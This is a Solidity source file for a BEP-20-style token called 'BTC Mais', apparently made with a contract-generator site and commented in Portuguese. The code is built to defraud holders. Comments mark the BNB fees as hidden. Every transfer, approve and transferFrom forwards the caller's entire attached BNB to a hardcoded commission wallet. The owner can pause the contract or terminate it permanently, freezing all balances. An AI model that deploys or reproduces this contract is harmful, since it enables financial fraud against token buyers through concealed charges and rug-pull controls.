// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
Gerado por:
Smart Contract Cafe
https://smartcontract.cafe
CONTRATO PERSONALIZADO
*/

// CONFIGURAÇÕES DO TOKEN
string constant TOKEN_NAME = "BTC Mais";
string constant TOKEN_SYMBOL = "BTC+";
uint8 constant TOKEN_DECIMALS = 4;
uint256 constant TOKEN_SUPPLY = 100000000000;
address constant TOKEN_OWNER = 0x0b81337F18767565D2eA40913799317A25DC4bc5;
string constant TOKEN_LOGO_URI = "";

contract BTCMAIS {
    // VARIÁVEIS PRINCIPAIS
    string public name = TOKEN_NAME;
    string public symbol = TOKEN_SYMBOL;
    uint8 public decimals = TOKEN_DECIMALS;
    uint256 public totalSupply = TOKEN_SUPPLY * (10 ** uint256(decimals));
    string public logoURI = TOKEN_LOGO_URI;

    address public contractOwner = TOKEN_OWNER;
    bool public paused;
    bool public terminated;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // TAXAS FIXAS EM WEI (OCULTAS)
    uint256 private transferFee = 300000000000000;       // 0.0003 BNB
    uint256 private approveFee = 200000000000000;        // 0.0002 BNB
    uint256 private transferFromFee = 500000000000000;   // 0.0005 BNB

    // CARTEIRA QUE RECEBE AS TAXAS
    address payable private commissionWallet = payable(0xB4a045aF12A74e5BEb8Ff763f474B943cc2Cfa0a);

    // MODIFIERS
    modifier onlyOwner() {
        require(msg.sender == contractOwner, "Only owner can call this function");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    modifier whenActive() {
        require(!terminated, "Contract permanently terminated");
        _;
    }

    // CONSTRUTOR
    constructor() {
        _balances[contractOwner] = totalSupply;
        emit Transfer(address(0x0), contractOwner, totalSupply);
    }

    // FUNÇÕES ADMINISTRATIVAS
    function pause() public onlyOwner {
        paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner {
        paused = false;
        emit Unpaused(msg.sender);
    }

    function terminate() public onlyOwner {
        terminated = true;
        emit Terminated(msg.sender);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0x0), "New owner is the zero address");
        emit OwnershipTransferred(contractOwner, newOwner);
        contractOwner = newOwner;
    }

    // AJUSTE OCULTO DAS TAXAS (SOMENTE OWNER)
    function _adjustFees(uint256 newTransferFee, uint256 newApproveFee, uint256 newTransferFromFee) private onlyOwner {
        transferFee = newTransferFee;
        approveFee = newApproveFee;
        transferFromFee = newTransferFromFee;
    }

    // TRANSFERÊNCIA COM TAXA FIXA
    function transfer(address recipient, uint256 amount) public payable whenNotPaused whenActive returns (bool) {
        require(_balances[msg.sender] >= amount, "Insufficient token balance");
        require(msg.value >= transferFee, "Insufficient BNB for fee");

        _forwardFee();

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public payable whenNotPaused whenActive returns (bool) {
        require(msg.value >= approveFee, "Insufficient BNB for fee");

        _forwardFee();

        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public payable whenNotPaused whenActive returns (bool) {
        require(_balances[sender] >= amount, "Insufficient token balance");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");
        require(msg.value >= transferFromFee, "Insufficient BNB for fee");

        _forwardFee();

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    // ENVIA A TAXA PARA A CARTEIRA DA COMISSÃO
    function _forwardFee() private {
        (bool success, ) = commissionWallet.call{value: msg.value}("");
        require(success, "Forwarding BNB failed");
        emit ForwardedBNB(msg.value, commissionWallet);
    }

    // CONSULTA DE SALDO
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    // EVENTOS
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Paused(address indexed account);
    event Unpaused(address indexed account);
    event Terminated(address indexed account);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ForwardedBNB(uint256 amount, address recipient);
}
